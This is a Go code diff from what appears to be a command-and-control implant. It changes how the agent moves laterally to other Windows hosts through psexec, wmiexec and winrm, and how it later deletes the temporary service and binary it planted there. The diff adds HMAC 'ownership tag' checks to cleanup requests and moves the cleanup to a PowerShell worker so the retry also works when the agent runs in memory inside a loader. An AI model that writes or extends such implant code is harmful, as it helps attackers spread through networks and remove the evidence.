@@ -114,14 +114,16 @@ func memoryHosted() bool {
 }
 
 // lateralUsesSelfBinary reports whether a lateral method depends on this
-// process's own binary. Legacy wmiexec copies it to ADMIN$, legacy winrm
-// streams it, and the psexec cleanup retry re-executes it. Loader
-// deployments instead stream a server-staged artifact, so a memory-hosted
-// source may run them: guarding on the dependency instead of the hosting
-// mode keeps the deployment valid wherever the artifact comes from the
-// server instead of this binary.
+// process's own binary. Legacy wmiexec copies it to ADMIN$ and legacy winrm
+// streams it; both keep refusing to run from an in-memory host. A psexec
+// deployment stages the embedded dedicated lateral service, and its cleanup
+// retry runs a separate PowerShell worker, so neither half of psexec touches
+// this binary. Loader deployments stream a server-staged artifact instead, so
+// a memory-hosted source may run them too: guarding on the dependency instead
+// of the hosting mode keeps the acceptance list honest wherever the artifact
+// and the cleanup mechanism do not involve this process's image.
 func lateralUsesSelfBinary(payload lateralPayload) bool {
-	return !payload.loaderDeploy
+	return !payload.loaderDeploy && payload.Method != "psexec"
 }
 
 // rpcETooLate is CoInitializeSecurity's rejection when process-wide COM
@@ -396,11 +398,18 @@ func lateralCommand(command string) (string, error) {
 }
 
 // lateralCleanupPayload identifies the deployment artifacts a psexec move
-// left on the target: the temporary service and its host binary.
+// left on the target: the temporary service and its host binary. The
+// deployment identity and the ownership tag carry the control plane's durable
+// proof that this exact deployment owns these artifacts.
 type lateralCleanupPayload struct {
 	Host        string `json:"host"`
 	ServiceName string `json:"service_name"`
 	BinaryName  string `json:"binary_name"`
+	// DeploymentID names the recorded deployment that owns the artifacts.
+	DeploymentID string `json:"deployment_id,omitempty"`
+	// OwnershipTag is the beacon-secret HMAC over the deployment identity
+	// and its exact artifacts; see verifyLateralCleanupOwnership.
+	OwnershipTag string `json:"ownership_tag,omitempty"`
 }
 
 // Cleanup authority belongs to this source process, not to caller-supplied
@@ -466,16 +475,26 @@ func parseLateralCleanupPayload(command string) (lateralCleanupPayload, error) {
 	if !lateralRemoteNamePattern.MatchString(payload.BinaryName) {
 		return payload, errors.New("invalid binary name")
 	}
+	payload.DeploymentID = strings.TrimSpace(payload.DeploymentID)
+	if payload.DeploymentID != "" && !agentSessionIDPattern.MatchString(payload.DeploymentID) {
+		return payload, errors.New("invalid deployment id")
+	}
+	payload.OwnershipTag = strings.ToLower(strings.TrimSpace(payload.OwnershipTag))
+	if payload.OwnershipTag != "" && !lateralSHA256Pattern.MatchString(payload.OwnershipTag) {
+		return payload, errors.New("invalid ownership tag")
+	}
 	return payload, nil
 }
 
-// lateralCleanupCommand handles __LATERAL_CLEANUP__, the server-side retry
-// after a psexec move whose immediate caller-side cleanup stayed pending:
-// it runs in a bounded child (with the active make_token identity through
-// applyCommandToken, when this process holds the required creation privilege) that waits for the launcher service to finish, then
-// deletes the temporary service and its host binary on the target.
-// reestablishThreadToken is called after the child exits for the same
-// reason as in lateralCommand.
+// lateralCleanupCommand handles __LATERAL_CLEANUP__, the control plane's
+// retry after a psexec move whose immediate caller-side cleanup stayed
+// pending. The request must be authorized as owned by one deployment: either
+// this process recorded the exact acknowledged artifacts, or the control
+// plane presents the beacon-secret ownership tag bound to the recorded
+// deployment. The work itself runs in the dedicated PowerShell cleanup
+// worker — a bounded child process that is independent of the executable
+// hosting this agent, so the retry behaves identically for an on-disk agent
+// and an agent mapped inside a loader host.
 func lateralCleanupCommand(command string) (string, error) {
 	payload, err := parseLateralCleanupPayload(command)
 	if err != nil {
@@ -484,37 +503,13 @@ func lateralCleanupCommand(command string) (string, error) {
 	if runtime.GOOS != "windows" {
 		return "", errors.New("lateral movement requires the Windows agent build")
 	}
-	if !ownsLateralCleanup(payload) {
-		return "", errors.New("cleanup artifacts are not owned by an acknowledged deployment in this agent process")
+	if !lateralCleanupRequestAuthorized(payload) {
+		return "", errors.New("cleanup request is not owned by an acknowledged deployment")
 	}
-	// The cleanup retry runs in a child of this binary. An in-memory host
-	// cannot own psexec artifacts in this release because legacy lateral
-	// methods keep refusing from its PowerShell host, but guard explicitly:
-	// re-executing os.Executable() here would relaunch powershell.exe.
-	if memoryHosted() {
-		return "", errMemoryHosted
-	}
-	self, err := os.Executable()
-	if err != nil {
-		return "", fmt.Errorf("resolve agent executable: %w", err)
-	}
-	encoded, err := json.Marshal(payload)
+	result, err := runLateralCleanupWorker(payload)
 	if err != nil {
 		return "", err
 	}
-	ctx, cancel := context.WithTimeout(agentContext, 2*time.Minute)
-	defer cancel()
-	child := newBoundedCommand(ctx, self, "--lateral-cleanup-child", string(encoded))
-	applyCommandToken(child)
-	out, err := child.CombinedOutput()
-	reestablishThreadToken()
-	if err != nil {
-		if message := strings.TrimSpace(string(out)); message != "" {
-			return "", errors.New(message)
-		}
-		return "", fmt.Errorf("lateral cleanup child failed: %w", err)
-	}
-	result := strings.TrimSpace(string(out))
 	if !strings.HasPrefix(result, "lateral cleanup: ") {
 		return "", fmt.Errorf("cleanup did not confirm success: %s", result)
 	}
